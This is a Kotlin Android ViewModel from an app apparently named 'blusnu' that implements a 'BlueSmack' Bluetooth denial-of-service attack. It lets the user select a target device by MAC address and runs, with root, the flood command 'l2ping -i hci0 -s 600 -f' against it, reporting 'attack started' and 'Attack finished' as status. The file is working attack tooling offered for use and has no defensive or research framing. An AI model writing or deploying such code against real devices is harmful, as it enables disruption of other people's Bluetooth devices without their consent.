package com.hereliesaz.blusnu.ui.bluesmack

import android.app.Application
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.hereliesaz.blusnu.data.ActionLogger
import com.hereliesaz.blusnu.data.DeviceRepository
import com.hereliesaz.blusnu.data.TargetDevice
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class BlueSmackViewModel(application: Application, deviceRepository: DeviceRepository) : AndroidViewModel(application) {

    private val _selectedDevice = MutableStateFlow<TargetDevice?>(null)
    val selectedDevice: StateFlow<TargetDevice?> = _selectedDevice

    private val _status = MutableStateFlow("")
    val status: StateFlow<String> = _status

    private val _devices = MutableStateFlow<List<TargetDevice>>(emptyList())
    val devices: StateFlow<List<TargetDevice>> = _devices.asStateFlow()

    private val bluetoothAdapter: BluetoothAdapter? = (application.getSystemService(BluetoothManager::class.java) as BluetoothManager).adapter

    init {
        viewModelScope.launch {
            deviceRepository.allDevices.collect {
                _devices.value = it
            }
        }
    }
    fun onDeviceSelected(device: TargetDevice) {
        _selectedDevice.value = device
    }

    fun startAttack() {
        val selected = _selectedDevice.value ?: return
        ActionLogger.log("BlueSmack attack started against ${selected.macAddress}.")

        if (bluetoothAdapter == null) {
            _status.value = "Bluetooth is not supported on this device"
            return
        }

        val device = try {
            bluetoothAdapter.getRemoteDevice(selected.macAddress)
        } catch (e: IllegalArgumentException) {
            _status.value = "Invalid MAC address"
            return
        }

        viewModelScope.launch {
            _status.value = "Running l2ping flood against ${device.address}... (requires root)"
            MacValidator.requireValid(device.address)
            val command = "l2ping -i hci0 -s 600 -f ${device.address}"
            val result = RootExecutor.execute(command)
            _status.value = if (result.isBlank()) "Attack finished." else result.take(200)
        }
    }
}
